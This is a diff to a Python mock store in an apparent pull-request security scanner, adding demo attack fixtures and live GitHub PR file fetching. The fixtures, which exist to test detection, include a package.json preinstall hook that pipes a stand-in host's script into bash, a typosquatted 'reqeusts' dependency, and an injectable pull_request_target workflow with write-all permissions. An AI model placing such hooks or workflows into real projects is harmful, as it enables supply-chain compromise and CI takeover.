@@ -323,25 +323,111 @@ class MockStore:
             return scan
         return None
 
-    def trigger_scan(self, repository: str, pr_number: int, head_sha: Optional[str] = None) -> ScanResponse:
+    async def _resolve_pr_files(self, repository: str, pr_number: int) -> Dict[str, str]:
+        import json
+        import httpx
+
+        # 1. Known attack demo scenarios
+        if "vulnerable-test-repo" in repository or "codefort" in repository:
+            if pr_number == 1:
+                return {
+                    "package.json": json.dumps({
+                        "name": "demo-telemetry-app",
+                        "version": "1.0.0",
+                        "scripts": {
+                            "preinstall": "curl -sL https://malicious-telemetry.sec/install.sh | bash"
+                        }
+                    }, indent=2)
+                }
+            elif pr_number == 2:
+                return {
+                    "package.json": json.dumps({
+                        "name": "demo-telemetry-app",
+                        "version": "1.0.0",
+                        "dependencies": {
+                            "reqeusts": "^2.31.0"
+                        }
+                    }, indent=2)
+                }
+            elif pr_number == 3:
+                return {
+                    ".github/workflows/validate.yml": """name: Automated PR Title Validator
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    permissions: write-all
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - name: Validate Title
+        run: echo "Checking ${{ github.event.pull_request.title }}"
+"""
+                }
+
+        if "clean-test-repo" in repository or pr_number == 4:
+            return {
+                "package.json": json.dumps({
+                    "name": "clean-telemetry-app",
+                    "version": "1.0.0",
+                    "dependencies": {
+                        "axios": "^1.7.0"
+                    }
+                }, indent=2)
+            }
+
+        # 2. For external GitHub repositories, attempt to fetch live PR files from GitHub API
+        try:
+            async with httpx.AsyncClient(timeout=4.0) as client:
+                headers = {"Accept": "application/vnd.github.v3+json", "User-Agent": "CodeFort-Scanner"}
+                res = await client.get(
+                    f"https://api.github.com/repos/{repository}/pulls/{pr_number}/files",
+                    headers=headers,
+                )
+                if res.status_code == 200:
+                    gh_files = res.json()
+                    result_files = {}
+                    for item in gh_files[:5]:
+                        filename = item.get("filename", "")
+                        raw_url = item.get("raw_url", "")
+                        patch = item.get("patch", "")
+                        if raw_url:
+                            raw_res = await client.get(raw_url, headers=headers)
+                            if raw_res.status_code == 200:
+                                result_files[filename] = raw_res.text
+                                continue
+                        if patch:
+                            result_files[filename] = patch
+                    if result_files:
+                        return result_files
+        except Exception:
+            pass
+
+        # 3. Fallback baseline if repository is private or unreadable
+        repo_short = repository.split("/")[-1] if "/" in repository else "demo-app"
+        return {
+            "package.json": json.dumps({
+                "name": repo_short,
+                "version": "0.1.0",
+                "dependencies": {
+                    "react": "^18.3.1"
+                }
+            }, indent=2)
+        }
+
+    async def trigger_scan(self, repository: str, pr_number: int, head_sha: Optional[str] = None) -> ScanResponse:
+        from app.services.engines.orchestrator import orchestrator
         scan_id = f"scan_{uuid.uuid4().hex[:8]}"
-        created_at = datetime.now(timezone.utc)
-        
-        # In a real scanner this queues async work; for deterministic dev skeleton we simulate completion
-        scan = ScanResponse(
-            id=scan_id,
-            repository=repository,
-            pull_request=pr_number,
-            status=ScanStatus.QUEUED,
-            verdict=Verdict.SCAN_PENDING,
-            risk_score=None,
-            coverage=CoverageInfo(),
-            summary=None,
-            created_at=created_at,
-        )
-        self.scans[scan_id] = scan
-        self.findings_by_scan[scan_id] = []
-        self.pr_latest_scan[f"{repository}#{pr_number}"] = scan_id
+
+        files = await self._resolve_pr_files(repository, pr_number)
+        scan, findings = await orchestrator.execute_scan(repository, pr_number, files, scan_id=scan_id)
+
+        self.scans[scan.id] = scan
+        self.findings_by_scan[scan.id] = findings
+        self.pr_latest_scan[f"{repository}#{pr_number}"] = scan.id
         return scan
 
     async def scan_files(self, repository: str, pr_number: int, files: Dict[str, str]) -> ScanResponse:
